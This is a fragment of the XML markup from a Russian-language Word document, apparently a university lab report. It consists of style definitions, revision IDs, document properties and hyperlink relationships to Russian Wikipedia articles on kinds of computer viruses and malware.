    <w:rsid w:val="00384ECC"/>
    <w:rsid w:val="00395299"/>
    <w:rsid w:val="00395E78"/>
    <w:rsid w:val="003B2153"/>
    <w:rsid w:val="003B7418"/>
    <w:rsid w:val="003C218B"/>
    <w:rsid w:val="003D414E"/>
    <w:rsid w:val="003E4132"/>
    <w:rsid w:val="003E4C7B"/>
    <w:rsid w:val="003F274E"/>
    <w:rsid w:val="0040671E"/>
    <w:rsid w:val="004156CB"/>
    <w:rsid w:val="004329C7"/>
    <w:rsid w:val="00453CBA"/>
    <w:rsid w:val="004557D2"/>
    <w:rsid w:val="00456558"/>
    <w:rsid w:val="00475C3D"/>
    <w:rsid w:val="00481B9B"/>
    <w:rsid w:val="00497F6F"/>
    <w:rsid w:val="004A5302"/>
    <w:rsid w:val="004B37E8"/>
    <w:rsid w:val="004B5CD2"/>
    <w:rsid w:val="004D6D91"/>
    <w:rsid w:val="004E373D"/>
    <w:rsid w:val="004E5FC2"/>
    <w:rsid w:val="004F230A"/>
    <w:rsid w:val="004F2A89"/>
    <w:rsid w:val="004F7F88"/>
    <w:rsid w:val="00506F69"/>
    <w:rsid w:val="00507CA0"/>
    <w:rsid w:val="00516DFF"/>
    <w:rsid w:val="005217A8"/>
    <w:rsid w:val="005265DF"/>
    <w:rsid w:val="00543630"/>
    <w:rsid w:val="00543F39"/>
    <w:rsid w:val="00544F2D"/>
    <w:rsid w:val="0057482E"/>
    <w:rsid w:val="00583CDD"/>
    <w:rsid w:val="00583F89"/>
    <w:rsid w:val="005C2332"/>
    <w:rsid w:val="005D2800"/>
    <w:rsid w:val="005E4F2A"/>
    <w:rsid w:val="005F5D88"/>
    <w:rsid w:val="00601F8B"/>
    <w:rsid w:val="00607841"/>
    <w:rsid w:val="00674524"/>
    <w:rsid w:val="006B3E75"/>
    <w:rsid w:val="006B4CA3"/>
    <w:rsid w:val="006C5B47"/>
    <w:rsid w:val="006C6255"/>
    <w:rsid w:val="006C7A54"/>
    <w:rsid w:val="006E2B77"/>
    <w:rsid w:val="006E7B40"/>
    <w:rsid w:val="006F5F48"/>
    <w:rsid w:val="00700485"/>
    <w:rsid w:val="0070592F"/>
    <w:rsid w:val="0071183B"/>
    <w:rsid w:val="007246FB"/>
    <w:rsid w:val="0075210F"/>
    <w:rsid w:val="00773594"/>
    <w:rsid w:val="0078465D"/>
    <w:rsid w:val="007930ED"/>
    <w:rsid w:val="007C378E"/>
    <w:rsid w:val="007D0609"/>
    <w:rsid w:val="007D3A85"/>
    <w:rsid w:val="007E0985"/>
    <w:rsid w:val="007F10B1"/>
    <w:rsid w:val="007F4321"/>
    <w:rsid w:val="008045D8"/>
    <w:rsid w:val="00820681"/>
    <w:rsid w:val="008231FF"/>
    <w:rsid w:val="008244CC"/>
    <w:rsid w:val="008302C7"/>
    <w:rsid w:val="00830F2D"/>
    <w:rsid w:val="00853432"/>
    <w:rsid w:val="00856000"/>
    <w:rsid w:val="00865F07"/>
    <w:rsid w:val="008A4FAB"/>
    <w:rsid w:val="008B1C72"/>
    <w:rsid w:val="008D6C4D"/>
    <w:rsid w:val="00900A6C"/>
    <w:rsid w:val="00917645"/>
    <w:rsid w:val="00917D90"/>
    <w:rsid w:val="00923E95"/>
    <w:rsid w:val="0093477C"/>
    <w:rsid w:val="00961BBB"/>
    <w:rsid w:val="0098016E"/>
    <w:rsid w:val="00983861"/>
    <w:rsid w:val="00985035"/>
    <w:rsid w:val="009A58F5"/>
    <w:rsid w:val="009A77CB"/>
    <w:rsid w:val="009B1702"/>
    <w:rsid w:val="009B3FD3"/>
    <w:rsid w:val="009C0CF1"/>
    <w:rsid w:val="009D0645"/>
    <w:rsid w:val="009F270C"/>
    <w:rsid w:val="009F4128"/>
    <w:rsid w:val="009F5065"/>
    <w:rsid w:val="00A2111C"/>
    <w:rsid w:val="00A233A8"/>
    <w:rsid w:val="00A32FCB"/>
    <w:rsid w:val="00A43AF9"/>
    <w:rsid w:val="00A62E9E"/>
    <w:rsid w:val="00A64183"/>
    <w:rsid w:val="00A914DE"/>
    <w:rsid w:val="00A95BAF"/>
    <w:rsid w:val="00A969A7"/>
    <w:rsid w:val="00AA5403"/>
    <w:rsid w:val="00AD03E2"/>
    <w:rsid w:val="00AE1D8A"/>
    <w:rsid w:val="00AE1FDE"/>
    <w:rsid w:val="00AE243B"/>
    <w:rsid w:val="00AE53D9"/>
    <w:rsid w:val="00B13B4B"/>
    <w:rsid w:val="00B20AF5"/>
    <w:rsid w:val="00B45179"/>
    <w:rsid w:val="00B57749"/>
    <w:rsid w:val="00B63568"/>
    <w:rsid w:val="00B6756A"/>
    <w:rsid w:val="00B968FE"/>
    <w:rsid w:val="00BB57D0"/>
    <w:rsid w:val="00BC29C3"/>
    <w:rsid w:val="00BE19C9"/>
    <w:rsid w:val="00BE1C48"/>
    <w:rsid w:val="00BF3DB4"/>
    <w:rsid w:val="00C1387D"/>
    <w:rsid w:val="00C174D6"/>
    <w:rsid w:val="00C212CE"/>
    <w:rsid w:val="00C36F05"/>
    <w:rsid w:val="00C469D8"/>
    <w:rsid w:val="00C5031D"/>
    <w:rsid w:val="00C53ADA"/>
    <w:rsid w:val="00C602B4"/>
    <w:rsid w:val="00C6615B"/>
    <w:rsid w:val="00C77E41"/>
    <w:rsid w:val="00C93DCC"/>
    <w:rsid w:val="00C94588"/>
    <w:rsid w:val="00CB3392"/>
    <w:rsid w:val="00CC7237"/>
    <w:rsid w:val="00CD58C6"/>
    <w:rsid w:val="00CD69E8"/>
    <w:rsid w:val="00D139C3"/>
    <w:rsid w:val="00D24CF4"/>
    <w:rsid w:val="00D32446"/>
    <w:rsid w:val="00D335CB"/>
    <w:rsid w:val="00D5217D"/>
    <w:rsid w:val="00D52829"/>
    <w:rsid w:val="00D60F71"/>
    <w:rsid w:val="00D67417"/>
    <w:rsid w:val="00D740EB"/>
    <w:rsid w:val="00DA1B1D"/>
    <w:rsid w:val="00DB63E5"/>
    <w:rsid w:val="00DB66C1"/>
    <w:rsid w:val="00DE2255"/>
    <w:rsid w:val="00E13401"/>
    <w:rsid w:val="00E20278"/>
    <w:rsid w:val="00E3112B"/>
    <w:rsid w:val="00E675B9"/>
    <w:rsid w:val="00E802CE"/>
    <w:rsid w:val="00E80FFE"/>
    <w:rsid w:val="00E85FF4"/>
    <w:rsid w:val="00EB2457"/>
    <w:rsid w:val="00EB4DC5"/>
    <w:rsid w:val="00EC03D0"/>
    <w:rsid w:val="00EC06C5"/>
    <w:rsid w:val="00EC5903"/>
    <w:rsid w:val="00ED3D3D"/>
    <w:rsid w:val="00EE7C04"/>
    <w:rsid w:val="00EF4ADA"/>
    <w:rsid w:val="00F03722"/>
    <w:rsid w:val="00F2105D"/>
    <w:rsid w:val="00F237AE"/>
    <w:rsid w:val="00F31AD1"/>
    <w:rsid w:val="00F52F00"/>
    <w:rsid w:val="00F570B7"/>
    <w:rsid w:val="00F63A18"/>
    <w:rsid w:val="00F66C63"/>
    <w:rsid w:val="00F67AC2"/>
    <w:rsid w:val="00F72418"/>
    <w:rsid w:val="00F72D85"/>
    <w:rsid w:val="00F7377D"/>
    <w:rsid w:val="00F74364"/>
    <w:rsid w:val="00F823F8"/>
    <w:rsid w:val="00F8765E"/>
    <w:rsid w:val="00F91A1E"/>
    <w:rsid w:val="00FA32D6"/>
    <w:rsid w:val="00FB359E"/>
    <w:rsid w:val="00FB5D42"/>
    <w:rsid w:val="00FD498F"/>
    <w:rsid w:val="00FE2979"/>
    <w:rsid w:val="00FE7FAB"/>
    <w:rsid w:val="00FF5DFA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2D0B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7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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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Title"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:link w:val="ac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d">
    <w:name w:val="Название рисунка"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7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e">
    <w:name w:val="Название таблицы"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7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c">
    <w:name w:val="Заголовок Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="ab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">
    <w:name w:val="Программный код"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7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f0">
    <w:name w:val="Текст внутри таблицы"/>
    <w:basedOn w:val="a7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8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8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8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8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8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8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8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8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8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2">
    <w:name w:val="НИР нумерованный список"/>
    <w:basedOn w:val="a7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7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f1">
    <w:name w:val="Intense Reference"/>
    <w:basedOn w:val="a8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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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7"/>
    <w:next w:val="a7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2">
    <w:name w:val="E-mail Signature"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="af3"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00F67AC2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="af3">
    <w:name w:val="Электронная подпись Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="af2"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00F67AC2"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
      <w:lang w:eastAsia="ru-RU"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="af4">
    <w:name w:val="Book Title"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="33"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00F67AC2"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="af5">
    <w:name w:val="Subtle Reference"/>
    <w:basedOn w:val="a8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9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7"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00985035"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="4"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="af6">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="a7"/>
    <w:uiPriority w:val="99"/>
    <w:qFormat/>
    <w:locked/>
    <w:rsid w:val="00F52F00"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="af7">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="a9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8">
    <w:name w:val="Рисунок"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="ad"/>
    <w:qFormat/>
    <w:rsid w:val="00BE19C9"/>
    <w:pPr>
      <w:keepNext/>
      <w:ind w:firstLine="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="af9">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="afa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b">
    <w:name w:val="Введение_заключение"/>
    <w:basedOn w:val="1"/>
    <w:next w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="00F52F00"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="afa">
    <w:name w:val="Текст выноски Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="af9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1">
    <w:name w:val="Список_ТИРЕ"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="8"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a0">
    <w:name w:val="Список_БУКВЫ"/>
    <w:basedOn w:val="a1"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="9"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a4">
    <w:name w:val="Список_ЦИФРЫ"/>
    <w:basedOn w:val="a0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0"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="11"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a5">
    <w:name w:val="Список источников"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="00384ECC"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:ind w:left="0" w:firstLine="851"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="afc">
    <w:name w:val="header"/>
    <w:basedOn w:val="a7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8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footer"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="aff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8"/>
    <w:link w:val="afe"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00D60F71"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="aff0">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="a7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1">
    <w:name w:val="_Название рисунка"/>
    <w:basedOn w:val="aff2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3">
    <w:name w:val="_Рисунок"/>
    <w:basedOn w:val="a7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2">
    <w:name w:val="caption"/>
    <w:aliases w:val="Вставленный объект"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:link w:val="aff4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5">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:locked/>
    <w:rsid w:val="00917645"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="aff4">
    <w:name w:val="Название объекта Знак"/>
    <w:aliases w:val="Вставленный объект Знак"/>
    <w:link w:val="aff2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8"/>
    <w:link w:val="aff6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7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6">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="a7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8">
    <w:name w:val="Основной текст Знак"/>
    <w:basedOn w:val="a8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9">
    <w:name w:val="Подпись к картинке_"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="affa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a">
    <w:name w:val="Подпись к картинке"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="aff9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8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7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b">
    <w:name w:val="Подпись к картинке + Курсив"/>
    <w:aliases w:val="Интервал 0 pt11"/>
    <w:basedOn w:val="aff9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c">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="004A5302"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="affd">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="affe"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="004A5302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8"/>
    <w:link w:val="affd"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="004A5302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4A5302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4A5302"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a3">
    <w:name w:val="Подпись рисунка"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:rsid w:val="00456558"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="30"/>
      </w:numPr>
      <w:suppressAutoHyphens/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="afff1">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00374C59"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="afff2">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00374C59"/>
    <w:rPr>
      <w:color w:val="800080" w:themeColor="followedHyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff3">
    <w:name w:val="Стиль Лабораторной"/>
    <w:basedOn w:val="a7"/>
    <w:link w:val="afff4"/>
    <w:qFormat/>
    <w:rsid w:val="002632D6"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:firstLine="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="afff4">
    <w:name w:val="Стиль Лабораторной Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="afff3"/>
    <w:rsid w:val="002632D6"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff5">
    <w:name w:val="Тема лабораторной работы"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="004D6D91"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="0"/>
      </w:tabs>
      <w:suppressAutoHyphens/>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:firstLine="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff6">
    <w:name w:val="МинОбрСПбПУ"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="004D6D91"/>
    <w:pPr>
      <w:ind w:right="567"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff7">
    <w:name w:val="Роспись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851" w:firstLine="0"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Times New Roman"/>
      <w:i/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="41">
    <w:name w:val="Подпись4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567" w:firstLine="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Times New Roman"/>
      <w:i/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a">
    <w:name w:val="Кто_я"/>
    <w:basedOn w:val="af6"/>
    <w:qFormat/>
    <w:rsid w:val="00111FF9"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="24"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="0"/>
      </w:tabs>
      <w:spacing w:before="240" w:after="200" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="567" w:firstLine="0"/>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="a6">
    <w:name w:val="Заголовок_пункта"/>
    <w:basedOn w:val="af6"/>
    <w:qFormat/>
    <w:rsid w:val="00111FF9"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="26"/>
      </w:numPr>
      <w:suppressAutoHyphens/>
      <w:ind w:firstLine="419"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff8">
    <w:name w:val="Заголовок_таблицы"/>
    <w:basedOn w:val="af0"/>
    <w:qFormat/>
    <w:rsid w:val="00111FF9"/>
    <w:rPr>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afff9">
    <w:name w:val="Название_таблицы"/>
    <w:basedOn w:val="aff2"/>
    <w:qFormat/>
    <w:rsid w:val="0030071C"/>
    <w:pPr>
      <w:keepNext/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="0"/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afffa">
    <w:name w:val="Название_рисунка"/>
    <w:basedOn w:val="aff2"/>
    <w:qFormat/>
    <w:rsid w:val="0030071C"/>
    <w:pPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="0"/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="afffb">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="a7"/>
    <w:next w:val="a7"/>
    <w:link w:val="afffc"/>
    <w:uiPriority w:val="30"/>
    <w:locked/>
    <w:rsid w:val="00D335C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c">
    <w:name w:val="Выделенная цитата Знак"/>
    <w:basedOn w:val="a8"/>
    <w:link w:val="afffb"/>
    <w:uiPriority w:val="30"/>
    <w:rsid w:val="00D335CB"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="4F81BD" w:themeColor="accent1"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="afffd">
    <w:name w:val="АААААААААА"/>
    <w:basedOn w:val="a7"/>
    <w:qFormat/>
    <w:rsid w:val="00D335CB"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="afffe">
    <w:name w:val="Subtle Emphasis"/>
    <w:basedOn w:val="a8"/>
    <w:uiPriority w:val="99"/>
    <w:locked/>
    <w:rsid w:val="0057482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Unix" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%AF%D0%B7%D1%8B%D0%BA_%D0%B0%D1%81%D1%81%D0%B5%D0%BC%D0%B1%D0%BB%D0%B5%D1%80%D0%B0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ru.wikipedia.org/wiki/%D0%91%D1%8D%D0%BA%D0%B4%D0%BE%D1%80" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1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1%82%D0%B5%D0%BB%D1%81-%D0%B2%D0%B8%D1%80%D1%83%D1%81" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%A1%D1%86%D0%B5%D0%BD%D0%B0%D1%80%D0%BD%D1%8B%D0%B9_%D1%8F%D0%B7%D1%8B%D0%BA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DOS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B%D0%B8%D0%BC%D0%BE%D1%80%D1%84%D0%BD%D1%8B%D0%B9_%D0%B2%D0%B8%D1%80%D1%83%D1%81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C%D0%B0%D0%BA%D1%80%D0%BE%D0%B2%D0%B8%D1%80%D1%83%D1%81%D1%8B" TargetMode="External"/><Relationship Id="rId19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31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image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7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BE%D1%87%D0%BD%D1%8B%D0%B9_%D0%B2%D0%B8%D1%80%D1%83%D1%81" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/Linux" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/Spyware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fontTable" Target="fontTable.xml"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%A4%D0%B0%D0%B9%D0%BB%D0%BE%D0%B2%D1%8B%D0%B9_%D0%B2%D0%B8%D1%80%D1%83%D1%81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Windows" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%A0%D1%83%D1%82%D0%BA%D0%B8%D1%82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av\OneDrive\&#1044;&#1086;&#1082;&#1091;&#1084;&#1077;&#1085;&#1090;&#1099;\&#1053;&#1072;&#1089;&#1090;&#1088;&#1072;&#1080;&#1074;&#1072;&#1077;&#1084;&#1099;&#1077;%20&#1096;&#1072;&#1073;&#1083;&#1086;&#1085;&#1099;%20Office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0</TotalTime>
  <Pages>27</Pages>
  <Words>3161</Words>
  <Characters>18020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2022-04-06T17:26:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-05-15T16:14:00Z</dcterms:modified>
</cp:coreProperties>
</file>